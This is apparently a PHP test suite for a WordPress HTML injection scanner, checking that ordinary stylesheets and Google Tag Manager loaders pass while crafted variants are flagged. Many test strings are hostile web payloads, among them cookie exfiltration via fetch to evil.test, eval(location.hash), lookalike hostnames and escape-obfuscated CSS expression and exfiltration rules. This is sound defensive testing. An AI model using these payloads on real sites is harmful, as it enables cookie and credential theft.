<?php
if (PHP_SAPI !== 'cli') { exit; }
define('ABSPATH', '/tmp/');
require dirname(__DIR__) . '/includes/html-injection-scanner.php';
error_reporting(E_ALL);
set_error_handler(static function ($level, $message) { if (error_reporting() & $level) { throw new RuntimeException($message); } return false; });
$checks = 0;
function verify_context($condition, $message) { if (!$condition) { throw new RuntimeException($message); } $GLOBALS['checks']++; }
function context_scan($html, $trusted = array()) { return TK_HTML_Injection_Engine::scan($html, 'https://site.test/', $trusted); }
function context_rule($result, $rule, $action = '') { foreach (array_merge($result['findings'], $result['suppressed']) as $finding) { if ($finding['rule'] === $rule && ($action === '' || $finding['action'] === $action)) { return $finding; } } return null; }
function context_js($js) { return context_scan('<script>' . $js . '</script>'); }
foreach (array('/assets/style.css', '/wp-content/themes/example/style.css', '/wp-content/plugins/elementor/assets/css/frontend.css', '/wp-content/uploads/elementor/css/post-22.css', '/wp-includes/css/dist/block-library/style.css', '/assets/font-awesome.css', '/assets/aos.css', 'https://fonts.googleapis.com/css2?family=Roboto&display=swap') as $url) {
    $scan = context_scan('<link rel="stylesheet" href="' . htmlspecialchars($url, ENT_QUOTES) . '">');
    verify_context(!$scan['findings'] && context_rule($scan, 'stylesheet', 'SKIP'), 'Normal stylesheet warned: ' . $url);
}
foreach (array("this.media='all'", " this.media = \"all\" ; ", "/* load */this.media='all';this.onload=null;", "this.onload=null;this.media='all'") as $handler) {
    $scan = context_scan('<link rel="stylesheet" href="/style.css" media="print" onload="' . htmlspecialchars($handler, ENT_QUOTES) . '">');
    verify_context(!$scan['findings'] && context_rule($scan, 'event_handler', 'SKIP')['rule_id'] === 'SAFE_CSS_ONLOAD_001', 'Valid CSS grammar not recognized: ' . $handler);
}
$preload = context_scan('<link rel=preload as=style href=/style.css onload="this.rel=\'stylesheet\'">');
verify_context(!$preload['findings'] && context_rule($preload, 'event_handler', 'SKIP'), 'Preload conversion not recognized');
foreach (array(
    '<link rel=stylesheet href=/style.css media=print onload="this.media=\'all\';maliciousFunction()">',
    '<link rel=stylesheet href=/style.css media=print onload="this.media=\'all\',fetch(\'https://evil.test/\'+document.cookie)">',
    '<link rel=stylesheet href=/style.css media=print onload="this.media=\'all\';//x&#10;evil()">',
    '<link rel=stylesheet href=/style.css media=print onload="this.media=\'all\'" onclick="steal()">',
    '<link rel=stylesheet href=https://attacker.example/style.css media=print onload="this.media=\'all\'">',
    '<link rel=stylesheet href=https://site.test.attacker.example/style.css media=print onload="this.media=\'all\'">',
    '<link rel=stylesheet href="javascript:evil()" media=print onload="this.media=\'all\'">',
    '<link rel=stylesheet href="https://site.test@evil.test/style.css" media=print onload="this.media=\'all\'">',
    '<img src=/style.css onload="this.media=\'all\'">',
    '<base href="https://evil.test/"><link rel=stylesheet href=/style.css media=print onload="this.media=\'all\'">',
    '<link rel=stylesheet href=/style.css media=screen onload="this.media=\'all\'">'
) as $html) { $scan = context_scan($html); verify_context(context_rule($scan, 'event_handler', 'SKIP') === null && context_rule($scan, 'event_handler') !== null, 'Malicious/ambiguous CSS handler suppressed: ' . $html); }
$scan = context_scan('<link rel=stylesheet href=/style.css media=print onload="this.media=\'all\'" style="width:expression(alert(1))">');
verify_context(context_rule($scan, 'css_expression', 'REPORT') !== null, 'Safe onload suppressed another dangerous attribute');
$loader = 'const script=document.createElement("script");script.src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXX";document.head.appendChild(script);';
verify_context(context_rule(context_js($loader), 'dynamic_script_loader', 'SKIP')['provider'] !== '', 'Google loader not recognized');
verify_context(context_rule(context_js(str_replace('const script=', 'var script=', $loader)), 'dynamic_script_loader', 'SKIP') !== null, 'var Google loader not recognized');
verify_context(context_rule(context_js(str_replace('script.src=', 'script.async=true;script.src=', $loader)), 'dynamic_script_loader', 'SKIP') !== null, 'Async Google loader not recognized');
$gtm = '(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({"gtm.start":new Date().getTime(),event:"gtm.js"});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!="dataLayer"?"&l="+l:"";j.async=true;j.src="https://www.googletagmanager.com/gtm.js?id="+i+dl;f.parentNode.insertBefore(j,f);})(window,document,"script","dataLayer","GTM-XXXXXXX");';
verify_context(context_rule(context_js($gtm), 'dynamic_script_loader', 'SKIP') !== null, 'Official GTM grammar not recognized');
$gtag = 'window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag("js",new Date());gtag("config","G-XXXXXXXX");';
$stored = TK_HTML_Injection_Engine::scan('<script>' . $gtag . '</script>', 'https://site.test/', array(), 0, true);
verify_context(!$stored['findings'] && context_rule($stored, 'stored_script', 'SKIP') !== null, 'Canonical stored gtag setup warned');
foreach (array(
    str_replace('www.googletagmanager.com', 'www.googletagmanager.com.attacker.example', $loader),
    str_replace('/gtag/js?id=G-XXXXXXXX', '/evil.js?id=G-XXXXXXXX', $loader),
    str_replace('https://', 'http://', $loader),
    str_replace('www.googletagmanager.com', 'www.googletagmanager.com@evil.test', $loader),
    str_replace('www.googletagmanager.com', 'www.googletagmanager.com:444', $loader),
    str_replace('G-XXXXXXXX', 'G-XXXXXXXX&callback=steal', $loader),
    str_replace('G-XXXXXXXX', 'G-XXXXXXXX&id=G-OTHER', $loader),
    str_replace('script.src=', 'script.onload=steal;script.src=', $loader),
    $loader . 'fetch("https://www.google-analytics.com/collect?c="+document.cookie);',
    str_replace('"https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXX"', 'location.hash.slice(1)', $loader),
    $gtm . 'eval(location.hash);',
    str_replace('event:"gtm.js"', 'event:document.cookie', $gtm)
) as $js) { $scan = context_js($js); verify_context(context_rule($scan, 'dynamic_script_loader', 'SKIP') === null && $scan['findings'], 'Modified/deceptive loader suppressed: ' . $js); }
$unknown = context_js(str_replace('https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXX', 'https://unknown.test/widget.js', $loader));
verify_context(context_rule($unknown, 'dynamic_script_loader', 'REVIEW') !== null, 'Unknown integration not retained for review');
$leak = context_js('fetch("https://www.googletagmanager.com/collect?x="+document.cookie);');
verify_context(context_rule($leak, 'cookie_outbound', 'REPORT')['severity'] === 'high', 'Recognized hostname hid cookie leakage');
$cooccurrence = context_js('var cookie=document.cookie;fetch("https://api.test/ping");');
verify_context(context_rule($cooccurrence, 'cookie_outbound', 'REVIEW')['severity'] === 'medium', 'Unproven co-occurrence classified high');
verify_context(context_rule(context_js('eval("2+2");'), 'dynamic_execution', 'REVIEW')['severity'] === 'medium', 'eval alone classified high');
verify_context(context_rule(context_js('eval(atob("eA=="));'), 'encoded_execution', 'REVIEW')['severity'] === 'medium', 'Encoded execution without impact automatically high');
verify_context(context_rule(context_js('eval(location.hash.slice(1));'), 'dynamic_execution', 'REPORT')['severity'] === 'high', 'User-controlled execution not detected');
verify_context(context_rule(context_scan('<img onerror="fetch(\'/sensitive-endpoint\')">'), 'event_handler', 'REPORT') !== null, 'Suspicious onerror transport skipped');
$comments = context_js('/* eval(atob("x")); document.cookie; fetch("https://evil.test") */const x="document.cookie eval(atob(sample))";');
verify_context(!$comments['findings'], 'Comments/string documentation treated as executable behavior');
$static = context_scan('<script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXX"></script>');
verify_context(!$static['findings'] && context_rule($static, 'external_script', 'SKIP'), 'Static Google script not recognized');
verify_context(context_rule(context_scan('<script src="https://www.googletagmanager.com/evil.js"></script>'), 'external_script', 'REVIEW') !== null, 'Trusted provider arbitrary path approved');
verify_context(context_rule(context_scan('<script src="http://evil.test/payload.js"></script>'), 'external_script', 'REPORT') !== null, 'Insecure external script not reported');
verify_context(context_rule(context_scan('<script src="https://custom.test/a.js"></script>', array('custom.test')), 'external_script', 'REVIEW') !== null, 'Custom host approved arbitrary script behavior');
$providers = TK_HTML_Injection_Context::providers();
foreach (array('body{color:red;background:url(/images/background.png)}', '@import "/wp-content/themes/a/a.css";', '@font-face{src:url(https://fonts.gstatic.com/s/roboto/v1/a.woff2)}', '.a:before{content:"expression(alert(1)) javascript: url(https://evil.test)"}', 'body{background:url(data:image/png;base64,AAAA)}', '.overlay{position:fixed;z-index:2147483647;opacity:0;inset:0}') as $css) {
    $scan = TK_HTML_Injection_CSS::scan($css, 'https://site.test/style.css', array(), $providers);
    verify_context(!$scan['findings'] && !$scan['limited'], 'Ordinary CSS flagged: ' . $css);
}
foreach (array(
    'css_expression' => 'div{width:expre\\73 sion(alert(1))}',
    'css_executable_url' => 'body{background:u\\72l(jav\\61script:alert)}',
    'css_external_import' => '@import "https://evil.test/style.css";',
    'css_external_resource' => 'body{background:url(https://external.test/ordinary.png)}',
    'css_exfiltration' => 'input[value^="a"]{background:url(https://evil.test/leak?a)}',
    'css_concealed_overlay' => 'body{position:fixed;z-index:2147483647;opacity:0;inset:0;background:url(https://evil.test/x)}'
) as $rule => $css) {
    $scan = TK_HTML_Injection_CSS::scan($css, 'https://site.test/', array(), $providers);
    verify_context(in_array($rule, array_column($scan['findings'], 'rule'), true), 'CSS rule missed: ' . $rule);
}
$scan = TK_HTML_Injection_CSS::scan('input[value^="a"]{background:url(https://fonts.gstatic.com/s/a.woff2)}', 'https://site.test/', array('fonts.gstatic.com'), $providers);
verify_context(in_array('css_exfiltration', array_column($scan['findings'], 'rule'), true), 'Trusted/provider hostname hid CSS exfiltration');
$state = array('report' => array('findings' => array(), 'suppressed' => array(), 'issues' => array()), 'restored' => array());
$finding = context_scan('<link rel=stylesheet href=/style.css media=print onload="this.media=\'all\'">')['suppressed'][0];
foreach (array('/', '/about/', '/works/', '/contact/') as $page) { tk_html_scan_record($state, $finding, 'Public HTML / https://site.test' . $page, 'https://site.test' . $page); }
verify_context(count($state['report']['suppressed']) === 1 && $state['report']['suppressed'][0]['occurrences'] === 4 && count($state['report']['suppressed'][0]['affected_urls']) === 4, 'Repeated markup not grouped across pages');
verify_context(tk_html_scan_statistics($state['report'])['duplicates_grouped'] === 3, 'Duplicate count wrong');
$separate = $finding; $separate['location'] .= '[other]'; tk_html_scan_record($state, $separate, 'Public HTML / https://site.test/', 'https://site.test/');
verify_context(count($state['report']['suppressed']) === 2, 'Distinct DOM locations merged');
tk_html_scan_record($state, $finding, 'posts #1 / post_content'); tk_html_scan_record($state, $finding, 'posts #2 / post_content');
verify_context(count($state['report']['suppressed']) === 4, 'Independent DB records merged');
$fp = $state['report']['suppressed'][0]['fingerprint']; $restored = array('report' => array('findings' => array(), 'suppressed' => array()), 'restored' => array($fp => array()));
tk_html_scan_record($restored, $finding, 'Public HTML / https://site.test/', 'https://site.test/');
verify_context(!$restored['report']['suppressed'] && $restored['report']['findings'][0]['classification'] === 'administrator_restored', 'Restore override lost on rescan');
$many = context_scan(str_repeat('<link rel=stylesheet href=/style.css>', 90) . '<script>fetch("https://evil.test/?x="+document.cookie)</script>');
verify_context($many['audit_overflow'] > 0 && context_rule($many, 'cookie_outbound', 'REPORT') !== null, 'Suppression budget stopped later threat detection');
verify_context(context_rule(context_js($loader . '`unsupported ${fetch(location.hash)}`'), 'dynamic_script_loader', 'SKIP') === null, 'Unsupported trailing JS syntax approved');
$late_threat = context_scan(str_repeat('<button onclick="toggleMenu()">Menu</button>', 55) . '<script>fetch("https://bad.test/?x="+document.cookie)</script>');
verify_context($late_threat['limited'] && context_rule($late_threat, 'cookie_outbound', 'REPORT') !== null, 'Weak findings exhausted the budget and hid a later threat');
$normal_library = context_js('var current=location.href;' . str_replace('https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXX', 'https://unknown.test/library.js', $loader));
verify_context(context_rule($normal_library, 'dynamic_script_loader', 'REVIEW')['severity'] === 'medium', 'Unrelated location read automatically made a loader HIGH');
verify_context(context_rule(context_scan('<script src="https://www.googletagmanager.com../gtag/js?id=G-XXXXXXXX"></script>'), 'external_script', 'SKIP') === null, 'Invalid repeated-dot hostname approved');
foreach (array('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css', 'https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css') as $url) { $r = context_scan('<link rel=preload as=style href="' . $url . '" onload="this.rel=\'stylesheet\'">'); verify_context(!$r['findings'] && context_rule($r, 'event_handler', 'SKIP') !== null, 'Recognized CSS library not approved'); }
foreach (array('https://cdnjs.cloudflare.com/ajax/libs/arbitrary/1.0.0/evil.css', 'https://cdnjs.cloudflare.com.attacker.test/ajax/libs/aos/2.3.4/aos.css', 'https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js') as $url) { verify_context(context_rule(context_scan('<link rel=preload as=style href="' . $url . '" onload="this.rel=\'stylesheet\'">'), 'event_handler', 'SKIP') === null, 'CSS provider approved arbitrary path/host/script'); }
$grouped = array('report' => array('findings' => array(), 'suppressed' => array()));
foreach (array('<script nonce="one">' . $loader . '</script>', '<script nonce="two">' . str_replace(';', ";\n ", $loader) . '</script>') as $index => $html) {
    $f = context_rule(context_scan($html), 'dynamic_script_loader', 'SKIP'); tk_html_scan_record($grouped, $f, 'Public HTML / page-' . $index, 'https://site.test/page-' . $index);
}
verify_context(count($grouped['report']['suppressed']) === 1 && $grouped['report']['suppressed'][0]['occurrences'] === 2, 'Nonce/format differences prevent stable script grouping');
$forms = array('report' => array('findings' => array(), 'suppressed' => array()));
verify_context(!context_js('const message="Hello\\nworld";console.log(message);')['findings'], 'Ordinary escaped string generated a warning');
verify_context(!context_js('const label=`Hello ${name}`;')['findings'], 'Unsupported syntax alone generated a security finding without behavior evidence');
foreach (array('text', 'password') as $kind) { $f = context_rule(context_scan('<form action="https://bad.test/submit"><input type=' . $kind . '></form>'), 'external_form'); tk_html_scan_record($forms, $f, 'Public HTML / ' . $kind, 'https://site.test/' . $kind); }
verify_context(count($forms['report']['findings']) === 2, 'Credential and ordinary forms merged because their opening tags match');
echo 'PASS: ' . $checks . " contextual CSS/provider/JS classification, malicious variants, deduplication, audit and risk checks\n";
